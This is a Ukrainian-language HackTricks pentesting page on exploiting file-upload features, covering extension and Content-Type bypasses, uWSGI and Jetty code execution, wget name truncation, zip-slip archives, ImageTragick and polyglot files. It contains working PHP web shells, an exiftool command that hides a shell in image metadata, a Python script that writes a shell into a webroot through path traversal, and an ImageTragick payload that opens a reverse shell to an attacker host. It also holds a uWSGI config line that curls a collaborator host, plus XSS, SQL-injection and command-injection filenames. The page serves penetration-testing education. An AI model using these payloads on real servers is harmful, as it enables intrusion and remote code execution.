# Завантаження файлів

{{#include ../../banners/hacktricks-training.md}}

## Загальна методологія завантаження файлів

Інші корисні розширення:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Обхід перевірок розширень файлів

1. Якщо застосовується, **перевірте** **попередні розширення.** Також протестуйте їх, використовуючи **великі літери**: _pHp, .pHP5, .PhAr ..._
2. _Перевірте **додавання валідного розширення перед** виконуваним розширенням (використовуйте також попередні розширення):_
- _file.png.php_
- _file.png.Php5_
3. Спробуйте додати **спеціальні символи в кінці.** Можна використовувати Burp для **bruteforce** всіх **ascii** та **Unicode** символів. (_Зауважте, що також можна спробувати використати **вищезгадані** **розширення**_)  
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Спробуйте обійти захист, **обманувши парсер розширень** на сервері за допомогою технік, таких як **подвоєння** **розширення** або **додавання сміття** (байти **null**) між розширеннями. _Також можна використати **попередні розширення** для підготовки кращого payload'а._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Додайте **ще один шар розширень** до попередньої перевірки:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Спробуйте поставити **виконуване розширення перед валідним розширенням** і сподівайтеся, що сервер налаштований неправильно. (корисно для експлуатації misconfig в Apache, де будь-що з розширенням **.php**, але **не обов'язково закінчуючись на .php**, буде виконувати код):
- _ex: file.php.png_
7. Використання **NTFS alternate data stream (ADS)** у **Windows**. У цьому випадку після забороненого розширення і перед дозволеним буде вставлено символ двокрапки ":”. В результаті на сервері буде створено **порожній файл із забороненим розширенням** (напр. "file.asax:.jpg”). Цей файл може бути редагований пізніше іншими техніками, наприклад, використовуючи його коротке ім'я. Патерн "**::$data**” також може бути використаний для створення непорожніх файлів. Тому додавання символу крапки після цього патерну може допомогти обійти подальші обмеження (наприклад "file.asp::$data.”)
8. Спробуйте перевантажити обмеження на довжину імені файлу. Валідне розширення буде обрізано. А злоякісний PHP залишиться. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

### Обхід Content-Type, Magic Number, Compression & Resizing

- Обійти перевірки **Content-Type**, встановивши значення заголовка **Content-Type**: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Обійти перевірку **magic number**, додавши на початок файлу **байти реального зображення** (заплутати команду _file_). Або вставити шелл всередину **metadata**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` або також можна **ввести payload безпосередньо** в зображення:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- Якщо до вашого зображення додається **компресія**, наприклад використовуючи стандартні PHP-бібліотеки як [PHP-GD](https://www.php.net/manual/fr/book.image.php), попередні техніки можуть бути неефективні. Проте можна використати **PLTE chunk** [**техніку, описану тут**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) для вставки тексту, який **виживе після компресії**.
- [**Github з кодом**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- Веб-сторінка також може **змінювати розмір** зображення, використовуючи, наприклад, PHP-GD функції `imagecopyresized` або `imagecopyresampled`. Проте можна використати **IDAT chunk** [**техніку, описану тут**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) для вставки тексту, який **виживе після компресії**.
- [**Github з кодом**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Інша техніка для створення payload'а, який **виживає при зміні розміру зображення**, використовуючи PHP-GD функцію `thumbnailImage`. Проте можна використати **tEXt chunk** [**техніку, описану тут**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) для вставки тексту, який **виживе після компресії**.
- [**Github з кодом**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Інші трюки для перевірки

- Знайти вразливість, яка дозволяє **перейменувати** вже завантажений файл (щоб змінити розширення).
- Знайти **Local File Inclusion** вразливість для виконання backdoor'а.
- **Можлива витік інформації**:
1. Завантажте **кілька разів** (і **одночасно**) **той самий файл** з **тим самим ім'ям**
2. Завантажте файл з **іменем** файлу або папки, який **вже існує**
3. Завантаження файлу з ім'ям **"." , "..” або "…”**. Наприклад, в Apache на **Windows**, якщо застосунок зберігає завантажені файли в директорії "/www/uploads/”, ім'я файлу "." створить файл "uploads” в директорії "/www/”.
4. Завантаження файлу, який може бути важко видалити, наприклад **"…:.jpg”** в **NTFS**. (Windows)
5. Завантаження файлу в **Windows** з **недопустимими символами** в імені, такими як `|<>*?”` . (Windows)
6. Завантаження файлу в **Windows** з використанням **зарезервованих** (заборонених) імен, таких як CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, and LPT9.
- Спробуйте також **завантажити виконуваний файл** (.exe) або **.html** (менш підозрілий), який **виконає код**, якщо випадково буде відкритий жертвою.

### Спеціальні трюки з розширеннями

Якщо ви намагаєтеся завантажити файли на **PHP server**, [погляньте на трюк з **.htaccess** для виконання коду](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
Якщо ви намагаєтеся завантажити файли на **ASP server**, [погляньте на трюк з **.config** для виконання коду](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

Файли `.phar` подібні до `.jar` для java, але для php, і можуть бути **використані як php файл** (виконувані з php, або включені всередину скрипту...)

Розширення `.inc` інколи використовується для php-файлів, які призначені лише для **імпорту інших файлів**, тому інколи може бути дозвіл на **виконання такого розширення**.

## **Jetty RCE**

Якщо ви можете завантажити XML файл на Jetty server, ви можете отримати [RCE, оскільки **нові \*.xml та \*.war обробляються автоматично**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Отже, як показано на наведеному зображенні, завантажте XML файл в `$JETTY_BASE/webapps/` і очікуйте оболонку!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

Для детального вивчення цієї вразливості перегляньте оригінальне дослідження: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) вразливості можуть бути експлуатовані в uWSGI серверах, якщо є можливість змінити `.ini` конфігураційний файл. Файли конфігурації uWSGI використовують специфічний синтаксис для включення "magic" змінних, плейсхолдерів та операторів. Зокрема, оператор '@', що використовується у вигляді `@(filename)`, призначений для включення вмісту файлу. Серед різних підтримуваних схем в uWSGI, схема "exec" є особливо потужною, дозволяючи читати дані зі stdout процесу. Цю можливість можна зловмисно використати для Remote Command Execution або Arbitrary File Write/Read, коли обробляється `.ini` конфігураційний файл.

Розглянемо наступний приклад шкідливого `uwsgi.ini` файлу, що демонструє різні схеми:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Виконання payload відбувається під час парсингу конфігураційного файлу. Щоб конфігурація була активована й розпарсена, процес uWSGI має бути перезапущений (можливо після збою або через Denial of Service атаку) або файл має бути налаштований на auto-reload. Функція auto-reload, якщо увімкнена, перезавантажує файл через вказані інтервали при виявленні змін.

Важливо розуміти поблажливу природу парсингу конфігураційних файлів uWSGI. Зокрема, обговорюваний payload можна вставити в бінарний файл (наприклад, зображення або PDF), що ще більше розширює поле для потенційної експлуатації.

## **wget File Upload/SSRF Trick**

Іноді може трапитися, що сервер використовує **`wget`** для **завантаження файлів** і ви можете **вказати** **URL**. У таких випадках код може перевіряти, чи розширення завантажуваних файлів входить у whitelist, щоб переконатися, що будуть завантажені лише дозволені файли. Однак, **цю перевірку можна обійти.**\
Максимальна довжина **filename** в **linux** — **255**, проте **wget** обрізає імена файлів до **236** символів. Ви можете **завантажити файл під назвою "A"\*232+".php"+".gif"**, ця назва файлу **обійде** **перевірку** (оскільки в цьому прикладі **".gif"** є **valid** розширенням), але `wget` **перейменує** файл на **"A"\*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Зверніть увагу, що **інший варіант**, про який ви можете подумати для обходу цієї перевірки, — змусити **HTTP server redirect to a different file**, тож початковий URL пройде перевірку, а потім wget завантажить перенаправлений файл з новою назвою. Це **не спрацює**, **якщо wget не використовується** з **параметром** `--trust-server-names`, оскільки **wget завантажить перенаправлену сторінку з іменем файлу, вказаним в оригінальному URL**.

## Інструменти

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) — потужний інструмент, створений для допомоги Pentesters та Bug Hunters у тестуванні file upload mechanisms. Він використовує різні bug bounty techniques для спрощення процесу виявлення та експлуатації вразливостей, забезпечуючи всебічну оцінку web applications.

### Corrupting upload indices with snprintf quirks (historical)

Деякі legacy upload handlers, які використовують `snprintf()` або подібне для побудови multi-file arrays з single-file upload, можуть бути обдурені для фальсифікації структури `_FILES`. Через невідповідності та усічення в поведінці `snprintf()`, ретельно сформований single upload може виглядати як кілька indexed files на боці сервера, що плутає логіку, яка очікує суворої форми (наприклад, трактуючи це як multi-file upload і виконуючи небезпечні гілки). Хоча сьогодні це нішеве явище, цей “index corruption” pattern іноді з'являється в CTFs та старих codebases.

## From File upload to other vulnerabilities

- Встановіть **filename** на `../../../tmp/lol.png` і спробуйте здійснити **path traversal**
- Встановіть **filename** на `sleep(10)-- -.jpg` і ви можете добитися **SQL injection**
- Встановіть **filename** на `<svg onload=alert(document.domain)>` щоб досягти **XSS**
- Встановіть **filename** на `; sleep 10;` щоб протестувати command injection (більше [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Спробуйте **різні svg payloads** з [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- Якщо ви можете вказати web server, щоб захопити image з URL, ви можете спробувати зловживати [SSRF](../ssrf-server-side-request-forgery/index.html). Якщо це **image** буде **saved** на якомусь **public** сайті, ви також можете вказати URL з [https://iplogger.org/invisible/](https://iplogger.org/invisible/) і **вкрасти інформацію кожного відвідувача**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Спеціально створені PDFs для XSS: на наступній сторінці показано, як **inject PDF data to obtain JS execution** (../xss-cross-site-scripting/pdf-injection.md). Якщо ви можете upload PDFs, ви можете підготувати PDF, який виконуватиме довільний JS згідно з наведеними інструкціями.
- Завантажте вміст \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) щоб перевірити, чи сервер використовує будь-який **antivirus**
- Перевірте, чи існує будь-яке **size limit** при uploading files

Ось топ-10 речей, які можна досягти шляхом upload (з [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Refer to [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) for other filetypes.

## Zip/Tar File Automatically decompressed Upload

Якщо ви можете завантажити ZIP, який буде розпакований на сервері, ви можете зробити 2 речі:

### Symlink

Завантажте архів, що містить soft links на інші файли, тоді, отримавши доступ до розпакованих файлів, ви отримаєте доступ до linked files:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Розпаковувати в різні папки

Несподіване створення файлів у директоріях під час розпаковування є серйозною проблемою. Попри початкові припущення, що така конфігурація могла б запобігти OS-level виконанню команд через malicious file uploads, підтримка ієрархічного стиснення та можливості directory traversal формату ZIP можуть бути використані. Це дозволяє атакувальникам обходити обмеження та escape secure upload directories шляхом маніпулювання decompression функціональністю цільового додатка.

Автоматизований експлойт для створення таких файлів доступний за адресою [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). Утилітою можна скористатися, як показано:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Також доступна опція — **symlink trick with evilarc**. Якщо метою є націлитися на файл, наприклад `/flag.txt`, слід створити символічне посилання на цей файл у вашій системі. Це гарантує, що evilarc не зіткнеться з помилками під час своєї роботи.

Нижче наведено приклад Python-коду, який використовується для створення шкідливого zip-файлу:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Зловживання стисненням для file spraying**

Для більш детальної інформації **перегляньте оригінальний пост на**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Створення PHP Shell**: PHP-код пишеться для виконання команд, переданих через змінну `$_REQUEST`.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying та створення zip-архіву**: Створюється кілька файлів і формується zip-архів, що містить ці файли.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Зміни за допомогою Hex Editor або vi**: Імена файлів всередині zip змінюються за допомогою vi або hex editor, замінюючи "xxA" на "../" для переходу між директоріями.

```bash
:set modifiable
:%s/xxA/..\//g
:x!
```

## ImageTragic

Завантажте цей вміст з розширенням зображення, щоб експлуатувати вразливість **(ImageMagick , 7.0.1-1)** (з [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Вбудовування PHP Shell у PNG

Вбудовування PHP Shell у chunk IDAT файлу PNG може ефективно обходити певні операції обробки зображень. Функції `imagecopyresized` та `imagecopyresampled` з PHP-GD особливо релевантні в цьому контексті, оскільки вони зазвичай використовуються для зміни розміру та ресемплінгу зображень відповідно. Здатність вбудованого PHP Shell залишатися неушкодженим після цих операцій є значною перевагою для певних сценаріїв використання.

Детальний розгляд цієї техніки, включно з методологією та потенційними застосуваннями, наведено в статті: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Цей ресурс дає всебічне розуміння процесу та його наслідків.

More information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot Files

Polyglot файли слугують унікальним інструментом у кібербезпеці, виступаючи як камелеони, що можуть одночасно коректно існувати у кількох форматах файлів. Цікавим прикладом є [GIFAR](https://en.wikipedia.org/wiki/Gifar), гібрид, який працює одночасно як GIF та RAR архів. Такі файли не обмежуються цим поєднанням; можливі й комбінації на кшталт GIF та JS або PPT та JS.

Головна користь polyglot файлів полягає в їхній здатності обходити заходи безпеки, що фільтрують файли за типом. Звичайна практика в багатьох застосунках — дозволяти лише певні типи файлів для завантаження, наприклад JPEG, GIF або DOC, щоб знизити ризик завантаження потенційно небезпечних форматів (наприклад JS, PHP або Phar). Однак polyglot, відповідаючи структурним критеріям кількох форматів, може непомітно обійти ці обмеження.

Незважаючи на адаптивність, polyglot файли мають обмеження. Наприклад, хоча polyglot може одночасно бути PHAR і JPEG, успішність його завантаження може залежати від політики платформи щодо розширень файлів. Якщо система сувора щодо дозволених розширень, сама по собі структурна подвійність polyglot може не забезпечити успішне завантаження.

More information in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Upload valid JSONs like if it was PDF

Як уникнути виявлення типу файлу, завантаживши валідний JSON файл навіть якщо це не дозволено, підробивши PDF файл (техніки з **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: Поки магічні байти `%PDF` присутні в перших 1024 байтах — файл вважається дійсним PDF (див. приклад у пості)
- **`pdflib` library**: Додайте фейковий PDF формат всередину поля JSON, щоб бібліотека вирішила, що це PDF (див. приклад у пості)
- **`file` binary**: Воно може читати до 1048576 байтів з файлу. Просто створіть JSON більший за цей розмір, щоб воно не могло розпарсити вміст як json, а потім всередині JSON помістіть початкову частину реального PDF — і воно вважатиме його PDF

## References

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#include ../../banners/hacktricks-training.md}}
